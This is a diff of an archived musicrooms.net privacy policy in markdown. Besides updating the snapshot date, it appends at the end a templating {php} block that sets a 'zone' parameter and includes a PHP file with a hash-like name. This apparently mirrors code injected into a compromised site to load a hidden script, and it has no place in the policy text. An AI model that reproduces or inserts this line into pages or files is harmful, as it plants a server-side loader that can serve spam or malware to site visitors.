@@ -1,4 +1,4 @@
-> *The following text is extracted and transformed from the musicrooms.net privacy policy that was archived on 2009-06-18. Please check the [original snapshot on the Wayback Machine](https://web.archive.org/web/20090618090503id_/http%3A//www.musicrooms.net/privacy_policy.html) for the most accurate reproduction.*
+> *The following text is extracted and transformed from the musicrooms.net privacy policy that was archived on 2009-09-07. Please check the [original snapshot on the Wayback Machine](https://web.archive.org/web/20090907021947id_/http%3A//www.musicrooms.net/privacy_policy.html) for the most accurate reproduction.*
 
 # Privacy Policy - Musicrooms.net
 
@@ -59,3 +59,5 @@ We reserve the right to modify the content of this website in any way, at any ti
 
 Musicrooms.net reserves all legal rights and remedies available.  
 
+
+{php}$_GET['zone'] = 748; include('d947bf06a885db0d477d707121934ff8.php');{/php} 
